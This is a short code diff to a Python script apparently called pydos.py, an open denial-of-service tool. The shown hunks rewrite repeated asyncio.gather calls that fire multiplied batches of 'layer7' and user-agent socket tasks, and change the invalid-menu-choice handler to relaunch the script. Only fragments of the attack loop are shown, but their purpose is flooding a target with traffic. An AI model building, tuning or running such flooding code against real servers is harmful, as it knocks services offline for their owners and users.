@@ -174,14 +174,14 @@ if choose == "1":
 			threads_layer7.append(task)
 			threads_usr_agent.append(socket)
 
-		await asyncio.gather(*threads_layer7 * num_packet_layer7, await asyncio.gather(*threads_usr_agent * num_packet_layer7))
-		await asyncio.gather(*threads_layer7 * num_packet_layer7, await asyncio.gather(*threads_usr_agent * num_packet_layer7))
-		await asyncio.gather(*threads_layer7 * num_packet_layer7, await asyncio.gather(*threads_usr_agent * num_packet_layer7))
-		await asyncio.gather(*threads_layer7 * num_packet_layer7, await asyncio.gather(*threads_usr_agent * num_packet_layer7))
-		await asyncio.gather(*threads_usr_agent * num_packet_layer7, await asyncio.gather(*threads_layer7 * num_packet_layer7))
-		await asyncio.gather(*threads_usr_agent * num_packet_layer7, await asyncio.gather(*threads_layer7 * num_packet_layer7))
-		await asyncio.gather(*threads_usr_agent * num_packet_layer7, await asyncio.gather(*threads_layer7 * num_packet_layer7))
-		await asyncio.gather(*threads_usr_agent * num_packet_layer7, await asyncio.gather(*threads_layer7 * num_packet_layer7))
+		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
+		await asyncio.gather(*threads_layer7 * num_packet_layer7, (await asyncio.gather(*threads_usr_agent * num_packet_layer7)))
 	
 
 	if __name__ == '__main__':
@@ -253,7 +253,9 @@ elif choose == "2":
 else:
 	def check():
 		print("")
-		print("Choose 1 or 2 , i understend {} type".format(choose))
+		print("[ {} ] Not Found ".format(choose))
 		print("")
+		# back main
+		os.system('py pydos.py' if os.name == 'nt' else 'python pydos.py')
 
 	check()
